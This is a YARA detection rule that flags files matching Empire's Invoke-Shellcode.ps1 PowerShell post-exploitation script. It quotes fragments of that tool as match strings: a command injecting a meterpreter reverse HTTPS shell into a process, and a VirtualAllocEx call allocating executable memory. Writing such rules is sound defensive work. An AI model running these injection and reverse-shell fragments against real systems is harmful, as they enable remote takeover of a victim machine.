rule SIGNATURE_BASE_Empire_Invoke_Shellcode : FILE
{
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "41788f71-cc99-50b3-bdc7-17b132ab2767"
		date = "2015-08-06"
		modified = "2023-12-05"
		reference = "https://github.com/PowerShellEmpire/Empire"
		source_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/yara/gen_powershell_empire.yar#L82-L98"
		license_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/LICENSE"
		hash = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"
		logic_hash = "968a140f75aa17bd9aac243483cade931dc047854b65b2f61146492c2cf01ea5"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii
		$s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii
		$s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii

	condition:
		filesize <100KB and 1 of them
}
